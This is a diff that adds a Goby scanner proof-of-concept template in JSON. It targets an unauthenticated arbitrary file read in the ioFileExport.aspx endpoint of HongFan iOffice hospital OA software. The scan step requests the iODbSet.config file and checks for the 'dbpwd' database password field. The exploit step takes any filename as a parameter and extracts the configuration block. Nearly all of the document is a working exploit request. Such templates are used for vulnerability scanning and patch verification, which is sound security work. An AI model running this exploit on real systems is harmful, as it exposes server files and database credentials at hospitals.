@@ -1,0 +1,109 @@
+{
+      "Name": "HongFan ioffice OA file Read",
+      "Level": "3",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "product=\"ioffice\"",
+      "Description": "红帆 ioffice 医院版 ioFileExport.aspx 存在未授权任意文件读取。",
+      "Product": "红帆iOffice医院OA",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "<p><span>通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或写入任意内容，往往能够使攻击者从服务器上获取敏感信息文件。</span><br></p>",
+      "Recommendation": "<p>1.升级版本</p><p>2.对关键字过滤</p><p>3.联系厂商打补丁</p>",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "filename",
+                  "Type": "input",
+                  "Value": "/ioffice/iODbSet.config"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/iODbSet.config&filename=iODbSet.config&ContentType=application/octet-stream",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "OR",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "dbpwd",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "group",
+                                    "operation": "OR",
+                                    "checks": [
+                                          {
+                                                "type": "item",
+                                                "variable": "$body",
+                                                "operation": "contains",
+                                                "value": "文件不存在",
+                                                "bz": ""
+                                          }
+                                    ]
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/ioffice/prg/set/iocom/ioFileExport.aspx?url={{{filename}}}&filename=iODbSet.config&ContentType=application/octet-stream",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|define|concat|文件不存在！",
+                        "output|lastbody|regex|(?s)<appSettings>(.*)<\\/configuration>"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-08 01:44:10",
+      "GobyVersion": "1.9.307"
+}
